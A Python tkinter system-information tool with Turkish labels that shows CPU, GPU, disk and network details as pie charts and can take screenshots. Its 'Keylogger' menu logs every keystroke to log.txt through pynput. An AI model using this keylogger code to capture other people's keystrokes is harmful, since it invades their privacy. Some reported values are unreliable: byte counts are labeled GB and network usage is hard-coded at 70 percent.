import tkinter as tk
from tkinter import messagebox
import GPUtil
import psutil
import matplotlib.pyplot as plt
import subprocess
import platform
import os 
from PIL import ImageGrab
import datetime
from pynput import keyboard
import shutil


def get_processor_name():
    if platform.system() == 'Windows':
        return platform.processor()
    elif platform.system() == 'Linux':
        command = "cat /proc/cpuinfo | grep 'model name' | uniq | awk -F':' '{print $2}'"
        output = subprocess.check_output(command, shell=True).decode().strip()
        return output
    elif platform.system() == 'Darwin':
        command = "/usr/sbin/sysctl -n machdep.cpu.brand_string"
        output = subprocess.check_output(command, shell=True).decode().strip()
        return output
    else:
        return "Unknown"

def get_cpu_info_from_command(command):
    try:
        output = subprocess.check_output(command, shell=True).decode().strip()
        return output.split('\n')[-1]
    except:
        return "Unknown"

def get_mainboard_info():
    try:
        command = "wmic baseboard get Manufacturer, Product"
        output = subprocess.check_output(command, shell=True).decode().strip()
        lines = output.split('\n')[1:]
        mainboard_info = [line.strip() for line in lines if line.strip()]
        return ', '.join(mainboard_info)
    except:
        return "Unknown"

def get_graphics_info():
    try:
        command = "wmic path win32_VideoController get Name"
        output = subprocess.check_output(command, shell=True).decode().strip()
        return output.split('\n')[-1]
    except:
        return "Unknown"

def get_memory_info():
    try:
        command = "wmic memorychip get Capacity"
        output = subprocess.check_output(command, shell=True).decode().strip()
        lines = output.split('\n')[1:]
        memory_info = [line.strip() for line in lines if line.strip()]
        total_memory = sum(int(info) for info in memory_info)
        return f"{total_memory} GB"
    except:
        return "Unknown"

def get_cpu_info():
    cpu_info = {
        'Processor Name': get_processor_name(),
        'Code Name': get_cpu_info_from_command('wmic cpu get Name'),
        'Package': get_cpu_info_from_command('wmic cpu get SocketDesignation'),
        'Technology': get_cpu_info_from_command('wmic cpu get Architecture'),
        'Specification': get_cpu_info_from_command('wmic cpu get Description'),
        'Clocks': get_cpu_info_from_command('wmic cpu get MaxClockSpeed'),
        'Core Speed': get_cpu_info_from_command('wmic cpu get CurrentClockSpeed'),
        'Multiplier': get_cpu_info_from_command('wmic cpu get CurrentClockSpeed') + ' / ' + get_cpu_info_from_command('wmic cpu get MaxClockSpeed'),
        'Bus Speed': get_cpu_info_from_command('wmic cpu get ExtClock'),
        'Cores': psutil.cpu_count(logical=False),
        'Threads': psutil.cpu_count(logical=True),
        'Caches': get_cpu_info_from_command('wmic cpu get L2CacheSize') + ' / ' + get_cpu_info_from_command('wmic cpu get L3CacheSize'),
        'Mainboard': get_mainboard_info(),
        'Graphics': get_graphics_info(),
        'Memory': get_memory_info()
    }
    
    messagebox.showinfo("CPU Bilgileri", format_cpu_info(cpu_info))
    
    # CPU Kullanım Yüzdesi
    cpu_percent = psutil.cpu_percent()
    labels = ['Kullanılan', 'Kullanılmayan']
    sizes = [cpu_percent, 100 - cpu_percent]
    colors = ['#ff9999', '#99ff99']
    explode = (0.1, 0)

    plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
    plt.axis('equal')
    plt.title('CPU Kullanım Yüzdesi')
    plt.show()


def get_gpu_info():
    gpus = GPUtil.getGPUs()
    if gpus:
        gpu = gpus[0]
        gpu_percent = gpu.load * 100
        gpu_temp = gpu.temperature
        messagebox.showinfo("GPU Bilgileri", f"GPU Kullanımı: {gpu_percent}%\nGPU Sıcaklığı: {gpu_temp}°C")

        # GPU Kullanım Yüzdesi
        labels = ['Kullanılan', 'Kullanılmayan']
        sizes = [gpu_percent, 100 - gpu_percent]
        colors = ['#ff9999', '#99ff99']
        explode = (0.1, 0)

        plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
        plt.axis('equal')
        plt.title('GPU Kullanım Yüzdesi')
        plt.show()

    else:
        messagebox.showwarning("Hata", "GPU bulunamadı.")


def format_cpu_info(cpu_info):
    formatted_info = ""
    for key, value in cpu_info.items():
        formatted_info += f"{key}: {value}\n"
    return formatted_info

def get_network_info():
    # Traverse the ipconfig information
    process = subprocess.Popen(['ipconfig', '/all'], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    output = output.decode(errors='ignore')

    messagebox.showinfo("Network Bilgileri", output)

    # Network Kullanım Yüzdesi
    network_percent = 70  # Örnek yüzde değeri, gerçek veriyle değiştirin
    labels = ['Kullanılan', 'Kullanılmayan']
    sizes = [network_percent, 100 - network_percent]
    colors = ['#ff9999', '#99ff99']
    explode = (0.1, 0)

    plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
    plt.axis('equal')
    plt.title('Network Kullanım Yüzdesi')
    plt.show()

def get_disk_usage():
    disk_usage = psutil.disk_usage('/')
    total_space = disk_usage.total
    used_space = disk_usage.used
    usage_percent = disk_usage.percent

    messagebox.showinfo("Disk Kullanımı", f"Toplam Alan: {total_space} GB\nKullanılan Alan: {used_space} GB\nKullanım Yüzdesi: {usage_percent}%")

    # Disk Kullanım Yüzdesi
    labels = ['Kullanılan', 'Kullanılmayan']
    sizes = [usage_percent, 100 - usage_percent]
    colors = ['#ff9999', '#99ff99']
    explode = (0.1, 0)

    plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
    plt.axis('equal')
    plt.title('Disk Kullanım Yüzdesi')
    plt.show()

def capture_screen(save_directory):
    # Ekran görüntüsünü yakala
    screenshot = ImageGrab.grab()
    
    # Kaydetmek için dosya adı oluştur
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"screen_capture_{current_time}.png"
    
    # Kayıt dizinine tam dosya yolu oluştur
    file_path = os.path.join(save_directory, file_name)
    
    # Ekran görüntüsünü kaydet
    screenshot.save(file_path)
    
    print("Ekran görüntüsü kaydedildi:", file_path)

listener = None  # Keylogger dinleyicisi

def on_press(key):
    try:
        with open("log.txt", "a") as file:
            file.write(str(key.char) + "\n")
    except AttributeError:
        with open("log.txt", "a") as file:
            file.write(str(key) + "\n")

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    messagebox.showinfo("Keylogger", "Keylogger başlatıldı.")

def stop_keylogger():
    global listener
    if listener and listener.is_alive():
        listener.stop()
        listener = None
        messagebox.showinfo("Keylogger", "Keylogger durduruldu.")
    else:
        messagebox.showwarning("Keylogger", "Keylogger zaten durdurulmuş.")

def view_keylog():
    try:
        with open("log.txt", "r") as file:
            messagebox.showinfo("Keylogger Log", file.read())
    except FileNotFoundError:
        messagebox.showwarning("Hata", "Log dosyası bulunamadı.")


# Ortak Arayüz
window = tk.Tk()
window.title("Genel Sistem Bilgileri")

# Menü
menu_bar = tk.Menu(window)
window.config(menu=menu_bar)

# CPU Menüsü
cpu_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="CPU", menu=cpu_menu)
cpu_menu.add_command(label="Bilgiler", command=get_cpu_info)
cpu_menu.add_command(label="Kullanım Yüzdesi", command=get_cpu_info)

# GPU Menüsü
gpu_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="GPU", menu=gpu_menu)
gpu_menu.add_command(label="Bilgiler", command=get_gpu_info)

# Network Menüsü
network_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Network", menu=network_menu)
network_menu.add_command(label="Bilgiler", command=get_network_info)

# Disk Menüsü
disk_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Disk", menu=disk_menu)
disk_menu.add_command(label="Kullanım Yüzdesi", command=get_disk_usage)

# Ekran Görüntüsü Menüsü
screenshot_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Ekran Görüntüsü", menu=screenshot_menu)
screenshot_menu.add_command(label="Al", command=lambda: capture_screen(os.getcwd()))

# Keylogger Menüsü
keylogger_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Keylogger", menu=keylogger_menu)
keylogger_menu.add_command(label="Başlat", command=start_keylogger)
keylogger_menu.add_command(label="Logları Görüntüle", command=view_keylog)
keylogger_menu.add_command(label="Durdur", command=stop_keylogger)



window.mainloop()

